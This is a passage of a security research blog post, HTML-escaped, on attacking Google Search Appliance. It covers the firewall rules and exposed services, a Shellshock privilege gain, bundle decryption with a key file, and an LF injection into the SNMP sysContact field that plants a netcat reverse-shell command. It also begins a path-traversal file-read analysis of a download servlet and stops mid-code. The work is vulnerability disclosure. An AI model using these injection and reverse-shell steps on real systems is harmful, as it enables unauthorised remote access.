      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;31300&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Despite the presence of so many services, most connections are blocked by iptables. 
The following are the iptables settings:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Redirect privileged ports.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# (we listen as nobody, which can&apos;t attach to low ports, so redirect to high ports)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 7800
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4430
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 444 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4431
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; ESTABLISHED,RELATED &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 22 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7800 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7801 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4430 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4431 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 19900 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8000 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9941 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9942 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 10999 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 68 &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 67 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 53 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 137:138 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 123 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 514 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 162 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The following summarizes the actual accessible TCP attack surface:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Program Location&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;/usr/sbin/sshd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7800&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4430&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19900&lt;/td&gt;
      &lt;td&gt;feedergate&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/feedergate&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8000&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseAdminConsole.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8443&lt;/td&gt;
      &lt;td&gt;stunnel&lt;/td&gt;
      &lt;td&gt;/usr/sbin/stunnel&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;And we found that the strings in file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/export/hda3/versionmanager/google_key.symmetric&lt;/code&gt; can be used to decrypt the content of all install bundles! 
After gaining privileges using CVE-2014-6271 and decrypting the contents of the install bundle, 
our research on vGSA has temporarily concluded.&lt;/p&gt;

&lt;p&gt;But its lacks of memory protection might have some vulnerabilities that can be easily exploited.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;gsa&quot;&gt;GSA&lt;/h3&gt;

&lt;p&gt;Upon booting the installed appliance and attempting to change the boot sequence,
we found that a password is required to enter the BIOS. 
Moreover, only some functions are accessible in the management interface of the Dell H700 RAID card:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, attempt to directly read the contents of the hard drive. 
If the hard drive content is not encrypted, there is a chance that the device’s operating system and software can be obtained directly.
We found that its hard drive uses SAS interface for transmission. 
Before attempting, it is necessary to purchase a SAS HBA card. The LSI 9211-8i is used for connection in this test:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After connecting and attempting to read, it was discovered that this is a Self-Encrypting Drive (SED). 
It requires a password to unlock for access. OSSLab has a more detailed explanation here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.osslab.com.tw/ata-sed-security/&quot;&gt;https://www.osslab.com.tw/ata-sed-security/&lt;/a&gt; (chinese article)&lt;/p&gt;

&lt;p&gt;There are several ways to continue trying when the hard drive cannot be directly accessed:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Try to read the password in the BIOS EEPROM and change the boot order.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This method requires damage to the motherboard and carries some risk. 
This method is only used when no vulnerabilities can be found at the software level.
More information: &lt;a href=&quot;https://blog.cybercx.co.nz/bypassing-bios-password&quot;&gt;https://blog.cybercx.co.nz/bypassing-bios-password&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Use PCILeech to read, write memory to gain system privileges.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This method requires specific PCI-e devices, which were not prepared at the time. You can refer to this GitHub project：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ufrisk/pcileech&quot;&gt;https://github.com/ufrisk/pcileech&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Look for software vulnerabilities that can access the service&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This method is simpler and more feasible.&lt;/p&gt;

&lt;h4 id=&quot;lf-injection-in-admin-console&quot;&gt;LF injection in Admin Console&lt;/h4&gt;

&lt;p&gt;After logging into the admin console, 
we observed a feature for obtaining system information through SNMP.
Additionally, this feature allows the insertion of custom strings.：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We tried classic LF injection here：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inject &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysContact&lt;/code&gt; with a LF and following command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extend shell /bin/nc -e /bin/sh 10.5.2.1 4444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After inserting the configuration value “extend”, 
we can use the command “snmpwalk” to trigger the SNMP’s extend functionality and execute a shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Command executed successfully, and connected back with a shell.&lt;/p&gt;

&lt;h4 id=&quot;arbitrary-file-reading&quot;&gt;Arbitrary File Reading&lt;/h4&gt;

&lt;p&gt;From GSA 6.x series versions, we found that the 80/443 web services use Apache httpd in the RPM installation package. 
There are several http configurations located in /etc/httpd/conf.d/. 
In the files gsa-http.conf and gsaa-https.conf, certain directories are redirected to specific local services.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  RewriteEngine on
  RewriteRule ^/security-manager/(.*) http://localhost:7886/security-manager/$1 [P,L]
  RewriteRule ^/d██████████/(.*) http://localhost:7890/dps/d██████████/$1 [P,L]
  RewriteRule ^/s██████/(.*) http://localhost:7890/dps/s██████/$1 [P,L]
  RewriteRule ^/v█████/(.*) http://localhost:7890/v█████/$1 [P,L]
  RewriteRule ^/$ http://localhost:7800/ [P,L]
  RewriteRule ^/(.*) http://localhost:7800/$1 [P,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The communication ports 7886 and 7890 are services run by separate Apache Tomcat servers. 
When proxying two or more web servers, the path determination of Tomcat, ..;/, 
is an interesting test point. You can refer to the article written by our employee for more details:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The point we’re interested in is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dps&lt;/code&gt;, which doesn’t seem to be present in the old version of GSA. 
Extracting /WEB-INF/web.xml from dps.war allows us to inspect the web application configuration, and we’ve found that the endpoint of /font will handled by
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;rootDirectory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;work/fonts/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/font/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And looking into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DPSDownloadServlet&lt;/code&gt;：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.documill.dps.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.servlet.ServletContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSDownloadServlet&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DownloadServlet&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSUserService&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DPSDownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getRealPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ServletContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;servletcontext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;DPS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSSingleton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getHomeDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;FileNotFoundException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DPSDownloadServlet:getRealPath:DPS home directory not specified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;nf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAbsolutePath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Step into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/code&gt; which extends &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DPSDownloadServlet&lt;/code&gt;：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpServletResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
